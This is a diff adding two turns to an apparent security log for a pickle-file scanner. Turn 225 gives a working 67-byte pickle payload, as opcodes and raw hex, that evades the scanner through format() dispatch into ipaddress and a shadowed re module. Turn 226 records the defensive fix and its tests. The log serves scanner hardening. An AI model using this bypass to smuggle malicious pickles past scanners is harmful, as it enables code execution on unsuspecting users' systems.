@@ -13142,3 +13142,199 @@ Performance note:
 - The Python call-graph pass now considers invocation-only references, still
   bounded by the existing `_MAX_IMPORT_REFERENCES` cap.
 - Warm scan median for the fixed 32-byte payload was `0.000101s` over 50 runs.
+
+## Turn 225 - Bypass via builtin `format()` protocol dispatch to `ipaddress`
+
+Found another scanner-clean RCE-capable bypass in Python protocol dispatch. The
+payload imports `ipaddress.IPv4Address`, constructs an instance, then invokes
+`builtins.format(instance, "b")`. At runtime this enters
+`IPv4Address.__format__()` / `_BaseAddress.__format__()`, which performs a
+function-body `import re` for non-string IP address format specifiers. A shadow
+`re.py` at the front of `sys.path` executes during `pickle.loads`.
+
+Payload shape:
+
+```text
+PROTO 4
+STACK_GLOBAL ipaddress IPv4Address
+SHORT_BINUNICODE "1.2.3.4"
+TUPLE1
+REDUCE              # construct IPv4Address("1.2.3.4")
+MEMOIZE
+STACK_GLOBAL builtins format
+MARK
+BINGET 0
+SHORT_BINUNICODE "b"
+TUPLE
+REDUCE              # format(address, "b") enters address.__format__
+STOP
+```
+
+Raw payload:
+
+```text
+80048c096970616464726573738c0b4950763441646472657373938c07312e322e332e348552948c086275696c74696e738c06666f726d6174932868008c016274522e
+```
+
+Scanner proof:
+
+```text
+payload_len 67
+scan clean complete findings 0 errors ()
+import_refs (
+  {'module': 'ipaddress', 'name': 'IPv4Address', 'is_dangerous': False},
+  {'module': 'builtins', 'name': 'format', 'is_dangerous': False}
+)
+invocations (
+  {'module': 'ipaddress', 'name': 'IPv4Address',
+   'opcode_position': 37, 'positional_arg_count': 1},
+  {'module': 'builtins', 'name': 'format',
+   'opcode_position': 65, 'positional_arg_count': 2}
+)
+calls format (
+  'format', 'str', 're.compile', '_address_fmt_re.fullmatch',
+  'super', 'm.groups', 'format', 'int'
+)
+path format None
+dangerous ()
+```
+
+Runtime proof:
+
+```text
+runtime rc 0
+runtime stdout
+result '00000001000000100000001100000100'
+marker_exists True
+marker_text re-owned
+
+runtime stderr
+```
+
+The child proof inserted a temporary module directory at the front of
+`sys.path`, removed `ipaddress` and `re` from `sys.modules`, and ran
+`pickle.loads(payload)`. The shadow `re.py` wrote the marker at import time and
+returned a minimal fake pattern object whose `fullmatch("b").groups()` produced
+the tuple expected by `ipaddress`.
+
+Why it bypasses:
+
+- Native policy does not mark `ipaddress.IPv4Address` or `builtins.format` as
+  dangerous.
+- The call graph sees `IPv4Address.__format__` as a method that calls
+  `re.compile`, but because the function-body import is inside a required-arg
+  method, the static no-arg path for that method is `None`.
+- Turn 224 handles constructed instance calls through `REDUCE`/`OBJ` by mapping
+  `Constructed(Foo)` directly to `Foo.__call__`. This payload uses a builtin
+  protocol dispatcher instead: the callable operand is `builtins.format`, and
+  Python dispatches to `obj.__format__(spec)` internally.
+- The native metadata therefore records only `builtins.format` with two
+  positional args. It never records that `ipaddress.IPv4Address.__format__` was
+  entered with the supplied format spec.
+- The payload contains no magic-method literal, so it avoids the generic
+  suspicious-string guard used for synthetic `__format__` payloads.
+
+Likely source-level defense:
+
+- Extend native callable-invocation metadata for builtin protocol dispatchers.
+  When a `REDUCE` invokes `builtins.format` with a constructed first argument,
+  emit an additional invocation for `Class.__format__` with one positional
+  argument. Apply the same pattern to finite builtin protocol dispatchers such
+  as `iter`, `next`, `len`, `bool`, `hash`, `str`, `repr`, `bytes`, and numeric
+  operators where the first operand is a tracked constructed object.
+- Keep this evidence-based: construction alone should remain clean, and the
+  extra method invocation should be emitted only when the stack proves a
+  protocol dispatcher was called on that constructed object.
+- The Python call-graph layer already has the arity-aware invoked-import path
+  needed once the native metadata names `ipaddress.IPv4Address.__format__`.
+
+Performance note:
+
+- Payload size is 67 bytes.
+- Warm scan median over 50 runs was `0.000070s` with max `0.000222s`.
+- The exploit uses two import references and two `REDUCE` opcodes, so it does
+  not stress the import-reference or opcode budgets.
+
+## Turn 226 - Defense for builtin `format()` protocol dispatch
+
+Implemented the source-level block for Turn 225. The native stack model now
+recognizes `builtins.format` as a protocol dispatcher when its first argument is
+a tracked constructed object, and emits an additional callable invocation for
+`Class.__format__`. The Python call graph also resolves inherited synthetic
+method targets back to the actual source method so arity-aware function-body
+import checks work for inherited methods such as
+`ipaddress.IPv4Address.__format__`.
+
+Fix details:
+
+- `consume_callable_opcode()` now returns all invocation facts for a reducer
+  call, not just the primary callable operand.
+- For `REDUCE`/`OBJ` calls to `builtins.format` with one or two arguments, if
+  the first argument is `Constructed(Class)`, the native scanner emits
+  `Class.__format__` with one positional argument.
+- The existing constructed-callable handling still maps direct
+  `REDUCE Constructed(Class)` to `Class.__call__`.
+- `_source_function_context()` now falls back through inherited class methods
+  when a synthetic inherited method target is present in `calls_by_function`
+  but is not physically defined on the child class.
+- Construction alone remains clean; the extra method invocation is emitted only
+  when the stack proves a protocol dispatcher was invoked on the constructed
+  object.
+
+Regression coverage:
+
+- `test_call_graph_models_builtin_format_protocol_dispatch_invocations`
+  verifies that `IPv4Address` construction plus `builtins.format` metadata stays
+  clean until the native protocol-dispatch metadata names
+  `IPv4Address.__format__`.
+- `test_scan_bytes_blocks_ipaddress_format_protocol_dispatch_import_rce`
+  scans the Turn 225 payload as malicious, verifies the new native
+  `IPv4Address.__format__` invocation metadata, and executes the payload in a
+  child interpreter with a shadow `re.py`.
+- Re-ran the existing `click.utils.LazyFile` startup-hook regression to guard
+  against broad class-entrypoint overreporting.
+
+Post-fix proof:
+
+```text
+payload_len 67
+scan malicious complete findings 1
+callable_invocations (
+  {'module': 'ipaddress', 'name': 'IPv4Address',
+   'opcode_position': 37, 'positional_arg_count': 1},
+  {'module': 'builtins', 'name': 'format',
+   'opcode_position': 65, 'positional_arg_count': 2},
+  {'module': 'ipaddress', 'name': 'IPv4Address.__format__',
+   'opcode_position': 65, 'positional_arg_count': 1}
+)
+call_graph [{'module': 'ipaddress', 'name': 'IPv4Address.__format__',
+  'sink': 'builtins.__import__',
+  'call_path': ('ipaddress.IPv4Address.__format__',
+                'builtins.__import__')}]
+dangerous (CallGraphFinding(module='ipaddress',
+  name='IPv4Address.__format__', sink='builtins.__import__'),)
+warm_median 0.000133
+warm_max 0.000217
+```
+
+Validation:
+
+- Rebuilt local Rust extension with
+  `uv tool run maturin develop -m packages/modelaudit-picklescan/Cargo.toml`.
+- Rust unit tests: `78 passed`.
+- Focused import/call-graph regression file: `19 passed in 1.05s`.
+- Focused call-graph suite: `57 passed in 2.43s`.
+- Focused `click.utils.LazyFile` startup-hook regression: `1 passed in 1.20s`.
+- `ruff format`: `392 files left unchanged`.
+- `ruff check --fix`: `All checks passed!`.
+- `mypy`: `Success: no issues found in 447 source files`.
+- Full non-slow/non-integration validation:
+  `3734 passed, 1022 skipped, 21 warnings in 51.12s`.
+
+Performance note:
+
+- The native protocol-dispatch check is stack-local and only inspects the
+  already-tracked reducer arguments for `builtins.format`.
+- The inherited-method source-context fallback uses existing bounded source
+  parsing and inherited-method limits.
+- Warm scan median for the fixed 67-byte payload was `0.000133s` over 50 runs.
